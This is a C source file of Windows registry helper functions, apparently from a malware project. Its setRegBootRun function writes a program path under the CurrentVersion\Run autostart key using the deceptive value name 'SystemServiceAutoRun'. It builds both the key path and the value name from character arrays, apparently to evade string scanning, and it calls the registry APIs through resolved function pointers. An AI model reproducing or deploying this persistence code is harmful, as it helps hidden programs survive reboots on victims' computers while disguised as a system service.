
#include <windows.h>
#include <lmcons.h>
#include <lmat.h>
#include <LMErr.h>
#include "api.h"

#include "public.h"
#include "utils.h"


DWORD getKeyValue(HKEY hMainKey, char* szSubKey, char* szKeyName, unsigned char* szKeyValue, int* valueLen)
{
	if (hMainKey == 0)
	{
		return FALSE;
	}

	char szout[1024];

	int osBits = getOsBits();

	DWORD dwType = KEY_READ | KEY_WRITE;

	PVOID dwWow64Value;
	if (osBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		dwType |= KEY_WOW64_64KEY;
		Wow64DisableWow64FsRedirection(&dwWow64Value);
	}

	HKEY hKey = 0;
	int iRes = 0;
	DWORD dwDisPos = 0;
	iRes = lpRegCreateKeyExA(hMainKey, szSubKey, 0, REG_NONE, REG_OPTION_NON_VOLATILE, dwType, 0, &hKey, &dwDisPos);
	if (osBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		Wow64RevertWow64FsRedirection(&dwWow64Value);
	}

	if (iRes != ERROR_SUCCESS)
	{
		return FALSE;
	}

	//if value is 234 ,it means out buffer is limit

	unsigned long subkeyType = REG_BINARY | REG_DWORD | REG_EXPAND_SZ | REG_MULTI_SZ | REG_NONE | REG_SZ;
	iRes = lpRegQueryValueExA(hKey, szKeyName, 0, &subkeyType, szKeyValue, (LPDWORD)valueLen);
	lpRegCloseKey(hKey);
	if (iRes == ERROR_SUCCESS)
	{
		return TRUE;
	}

	return FALSE;
}



DWORD setKeyValueStr(HKEY hMainKey, char* szSubKey, char* szKeyName, char* szKeyValue)
{
	char szout[1024];

	if (hMainKey == 0)
	{
		return FALSE;
	}

	DWORD dwDisPos = 0;
	HKEY hKey = 0;
	int iRes = 0;

	int osBits = getOsBits();

	DWORD dwType = KEY_READ | KEY_WRITE;

	PVOID dwWow64Value;
	if (osBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		dwType |= KEY_WOW64_64KEY;
		Wow64DisableWow64FsRedirection(&dwWow64Value);
	}

	iRes = lpRegCreateKeyExA(hMainKey, szSubKey, 0, REG_NONE, REG_OPTION_NON_VOLATILE, dwType, 0, &hKey, &dwDisPos);
	if (osBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		Wow64RevertWow64FsRedirection(&dwWow64Value);
	}

	if (iRes != ERROR_SUCCESS)
	{
		return FALSE;
	}

	unsigned char szQueryValue[MAX_PATH] = { 0 };
	unsigned long iQueryLen = MAX_PATH;
	unsigned long iType = REG_BINARY | REG_DWORD | REG_EXPAND_SZ | REG_MULTI_SZ | REG_NONE | REG_SZ;
	//if value is 234 ,it means out buffer is limit
	iRes = lpRegQueryValueExA(hKey, szKeyName, 0, &iType, szQueryValue, &iQueryLen);
	if (iRes == ERROR_SUCCESS)
	{
		if (lstrcmpiA((char*)szQueryValue, szKeyValue) != 0)
		{
			iRes = lpRegSetValueExA(hKey, szKeyName, 0, REG_SZ, (unsigned char*)szKeyValue, lstrlenA(szKeyValue));
			if (iRes != ERROR_SUCCESS)
			{
				lpRegCloseKey(hKey);
				return FALSE;
			}
			else
			{
				lpRegCloseKey(hKey);
				//RegFlushKey(hKey);
				return TRUE;
			}
		}
		else
		{
			runLog("key has been existed\r\n");
		}

		lpRegCloseKey(hKey);
		return TRUE;
	}
	else
	{
		iRes = GetLastError();		//2
		iRes = lpRegSetValueExA(hKey, szKeyName, 0, REG_SZ, (unsigned char*)szKeyValue, lstrlenA(szKeyValue));
		if (iRes != ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			return FALSE;
		}
		else
		{
			lpRegCloseKey(hKey);
			//RegFlushKey(hKey);
			return TRUE;
		}
	}

	return FALSE;
}


DWORD setKeyValueDword(HKEY hMainKey, char* szSubKey, char* szKeyName, DWORD dwKeyValue)
{
	if (hMainKey == 0)
	{
		return FALSE;
	}

	DWORD dwType = KEY_READ | KEY_WRITE;

	int osBits = getOsBits();

	PVOID dwWow64Value;
	if (osBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		dwType |= KEY_WOW64_64KEY;
		Wow64DisableWow64FsRedirection(&dwWow64Value);
	}

	HKEY hKey = 0;
	int iRes = 0;
	DWORD dwDisPos = 0;
	iRes = lpRegCreateKeyExA(hMainKey, szSubKey, 0, REG_NONE, REG_OPTION_NON_VOLATILE, dwType, 0, &hKey, &dwDisPos);
	if (osBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		Wow64RevertWow64FsRedirection(&dwWow64Value);
	}

	if (iRes != ERROR_SUCCESS)
	{
		return FALSE;
	}

	DWORD szQueryValue = 0;
	unsigned long iQueryLen = sizeof(DWORD);
	unsigned long iType = REG_BINARY | REG_DWORD | REG_EXPAND_SZ | REG_MULTI_SZ | REG_NONE | REG_SZ;
	//if value is 234 ,it means out buffer is limit
	iRes = lpRegQueryValueExA(hKey, szKeyName, 0, &iType, (LPBYTE)&szQueryValue, &iQueryLen);
	if (iRes == ERROR_SUCCESS)
	{
		if (szQueryValue == dwKeyValue)
		{
			lpRegCloseKey(hKey);
			return TRUE;
		}
		else
		{
			iRes = lpRegSetValueExA(hKey, szKeyName, 0, REG_DWORD, (BYTE*)&dwKeyValue, sizeof(dwKeyValue));
			if (iRes != ERROR_SUCCESS)
			{
				lpRegCloseKey(hKey);
				return FALSE;
			}
			else
			{
				//RegFlushKey(hKey);
				lpRegCloseKey(hKey);
				return TRUE;
			}
		}
	}
	else
	{
		iRes = GetLastError();
		iRes = lpRegSetValueExA(hKey, szKeyName, 0, REG_DWORD, (BYTE*)&dwKeyValue, sizeof(dwKeyValue));
		if (iRes != ERROR_SUCCESS)
		{
			lpRegCloseKey(hKey);
			return FALSE;
		}
		else
		{
			//RegFlushKey(hKey);
			lpRegCloseKey(hKey);
			return TRUE;
		}
	}

	return FALSE;
}


//need admin priority to modify reg of local_machine
int setRegBootRun(HKEY hMainKey,const char* strResidence)
{
	//'Software\Microsoft\Windows\CurrentVersion\RunServicesOnce',0
	//'Software\Microsoft\Windows\CurrentVersion\RunServices',0
	//'Software\Microsoft\Windows\CurrentVersion\RunOnce',0
	char path[] = { 'S','o','f','t','w','a','r','e',0x5c,'M','i','c','r','o','s','o','f','t',0x5c,
		'W','i','n','d','o','w','s',0x5c,'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n',0x5c,0 };

	char key[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e','A','u','t','o','R','u','n',0 };

	// 	char key64[] = {'S','o','f','t','w','a','r','e',0x5c,'W','o','w','6','4','3','2','N','o','d','e',
	// 		0x5c,'M','i','c','r','o','s','o','f','t',0x5c,
	// 		'W','i','n','d','o','w','s',0x5c,'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n',0x5c,0};

	DWORD dwType = KEY_READ | KEY_WRITE;

	int osBits = getOsBits();

	PVOID dwWow64Value;
	if (osBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		dwType |= KEY_WOW64_64KEY;
		Wow64DisableWow64FsRedirection(&dwWow64Value);
	}

	DWORD dwDisPos = 0;
	HKEY hKey = 0;
	int iRes = 0;
	iRes = lpRegCreateKeyExA(hMainKey, path, 0, REG_NONE, REG_OPTION_NON_VOLATILE, dwType, 0, &hKey, &dwDisPos);

	if (osBits == 64 && hMainKey == HKEY_LOCAL_MACHINE)
	{
		Wow64RevertWow64FsRedirection(&dwWow64Value);
	}

	if (iRes != ERROR_SUCCESS)
	{
		return FALSE;
	}

	unsigned char value[MAX_PATH] = { 0 };
	unsigned long valuelen = MAX_PATH;
	unsigned long iType = REG_BINARY | REG_DWORD | REG_EXPAND_SZ | REG_MULTI_SZ | REG_NONE | REG_SZ;
	//if value is 234 ,it means out buffer is limit
	iRes = lpRegQueryValueExA(hKey, key, 0, &iType, value, &valuelen);
	if (iRes == ERROR_SUCCESS && lstrcmpiA((char*)value, strResidence) == 0)
	{
		lpRegCloseKey(hKey);
		return TRUE;
	}
	else
	{
		iRes = GetLastError();
		//2 is not exist

		iRes = lpRegSetValueExA(hKey, key, 0, REG_SZ, (unsigned char*)strResidence, lstrlenA(strResidence));
		//RegFlushKey(hKey);
		lpRegCloseKey(hKey);
		if (iRes != ERROR_SUCCESS)
		{
			return FALSE;
		}
		else
		{
			return TRUE;
		}
	}

	return FALSE;
}